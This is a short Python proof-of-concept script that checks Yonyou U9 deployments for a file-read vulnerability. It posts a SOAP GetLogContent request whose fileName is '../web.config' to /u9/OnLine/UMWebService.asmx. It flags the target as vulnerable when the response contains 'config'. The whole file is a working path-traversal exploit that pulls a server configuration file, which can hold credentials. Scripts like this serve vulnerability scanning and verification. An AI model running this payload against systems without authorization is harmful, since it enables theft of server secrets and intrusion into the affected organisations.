import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U9-UMWebService.asmx存在文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '"http://tempuri.org/GetLogContent"',
        'Accept-Encoding': 'gzip'
    }
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetLogContent xmlns="http://tempuri.org/">
          <fileName>../web.config</fileName>
        </GetLogContent>
      </soap:Body>
    </soap:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/u9/OnLine/UMWebService.asmx")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'config' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult